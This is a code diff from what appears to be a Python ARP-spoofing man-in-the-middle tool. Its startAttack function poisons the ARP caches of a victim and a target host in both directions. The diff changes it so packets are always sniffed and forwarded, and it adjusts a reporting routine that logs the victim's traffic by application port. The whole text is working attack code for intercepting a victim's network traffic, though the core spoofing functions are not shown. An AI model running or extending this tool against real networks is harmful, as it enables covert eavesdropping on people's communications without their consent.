@@ -33,10 +33,9 @@ def startAttack(victimIp, targetIp, iface, report):
     threading.Thread(target=arpSpoof, args=(victimIp, targetIp, iface), daemon=True).start()
     threading.Thread(target=arpSpoof, args=(targetIp, victimIp, iface), daemon=True).start()
     # Start sniffing and forwarding packets
+    sniffAndForward(victimIp, targetIp, iface)
     if report == 1:
         createReport(victimIp, targetIp, iface)
-    else:
-        sniffAndForward(victimIp, targetIp, iface)
 
 def createReport(victimIp, targetIp, iface):
     applicationPorts = {
@@ -96,7 +95,7 @@ def createReport(victimIp, targetIp, iface):
     try:
         print(f"\nSniffing packets involving {victimIp}... Press Ctrl+C to stop and create a report.")
         time.sleep(1)
-        sniff(iface=iface, filter="ip", prn=lambda pkt: (packetCallback(pkt), forwardPacket(pkt, victimIp, targetIp, iface)), store=False, timeout=None)
+        sniff(iface=iface, filter="ip", prn=packetCallback, store=False, timeout=None)
     except KeyboardInterrupt:
         print("\nStopping packet sniffing.")
 
